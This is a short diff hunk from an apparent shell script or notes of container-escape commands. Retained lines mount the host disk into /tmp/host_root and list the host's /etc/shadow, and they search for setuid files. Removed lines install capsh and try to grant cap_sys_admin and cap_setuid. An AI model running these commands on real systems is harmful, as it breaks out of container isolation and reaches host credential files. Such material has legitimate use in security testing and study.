@@ -28,7 +28,6 @@ mkdir /tmp/host_root
 mount /dev/sda1 /tmp/host_root
 ls /tmp/host_root/etc/shadow
 find /dev/vd* -perm -4000 -type f -ls 2>/dev/null
-sudo apt install capsh
-capsh --caps="cap_sys_admin+eip cap_setuid+eip" --user=root--
+
 sudo mount /dev/vda1 /tmp/host_root
 ls -l /dev/ | grep -E 'sd|nvme|vd'
